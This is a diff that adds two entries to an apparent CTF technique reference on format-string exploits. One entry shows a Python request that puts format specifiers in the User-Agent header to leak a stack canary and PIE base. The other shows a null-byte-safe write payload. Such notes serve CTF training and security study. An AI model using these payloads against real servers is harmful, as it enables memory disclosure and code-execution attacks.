@@ -19,6 +19,8 @@
 - [printf_function_table Overwrite via Buffer Overflow (34C3 CTF 2017)](#printf_function_table-overwrite-via-buffer-overflow-34c3-ctf-2017)
 - [scanf Format String on Stack Overwrite (TUCTF 2017)](#scanf-format-string-on-stack-overwrite-tuctf-2017)
 - [Format String Exploit Through ROT13 Encoding (SunshineCTF 2018)](#format-string-exploit-through-rot13-encoding-sunshinectf-2018)
+- [Format String in HTTP User-Agent for PIE Leak (X-MAS CTF 2018)](#format-string-in-http-user-agent-for-pie-leak-x-mas-ctf-2018)
+- [Null-Byte Address Fragmentation in Small Buffers (FireShell 2019)](#null-byte-address-fragmentation-in-small-buffers-fireshell-2019)
 
 ---
 
@@ -658,3 +660,36 @@ io.interactive()
 **Key insight:** When input is transformed before reaching printf (ROT13, Caesar, etc.), pre-encode the format string payload with the inverse transform. ROT13 is self-inverse, so `rot13(rot13(payload)) = payload` reaches printf intact. This applies to any invertible transformation applied before a format string sink -- XOR, base64, substitution ciphers, etc.
 
 **References:** SunshineCTF 2018
+
+---
+
+## Format String in HTTP User-Agent for PIE Leak (X-MAS CTF 2018)
+
+**Pattern:** A PIE-compiled HTTP server logs the `User-Agent` header with `printf(ua)`. No other info-leak primitives exist, but the stack canary and PIE base both sit near the logging frame. One request leaks both in a single response.
+
+```python
+# Leak canary at offset 6, PIE base at offset 7
+r = requests.get('http://target/', headers={'User-Agent': '%6$p.%7$p'})
+canary, pie = [int(x, 16) for x in r.text.strip().split('.')]
+pie_base = pie - elf.sym['main']
+```
+
+**Key insight:** Any header parsed into a format-string sink turns a remote HTTP server into a leak oracle. Check logs, error messages, and reflected headers before assuming you need a binary-local primitive.
+
+**References:** X-MAS CTF 2018 — I want that toy, writeup 12672
+
+---
+
+## Null-Byte Address Fragmentation in Small Buffers (FireShell 2019)
+
+**Pattern:** The vulnerable buffer is 16 bytes, so a typical `fmtstr_payload(offset=..., writes={addr: val})` fails because `printf` stops at the first null byte in `addr`. Work around it by placing the format specifier *first* and the target address *last* in the buffer — printf consumes the format bytes before it hits the null.
+
+```python
+fmtstr = b"%9x%11$n" + b"\x20\x20\x60\x00\x00\x00\x00\x00"
+# printf processes %9x%11$n using the address at offset 11 (the trailing 8 bytes)
+# Writes 0x9 (from %9x count) to *0x602020
+```
+
+**Key insight:** Format-string null-byte restrictions only bite when the address precedes the format directives. Put the directives first so `printf` parses them before touching the address, then let `%$n` reference the trailing address slot.
+
+**References:** FireShell CTF 2019 — casino, writeup 12916
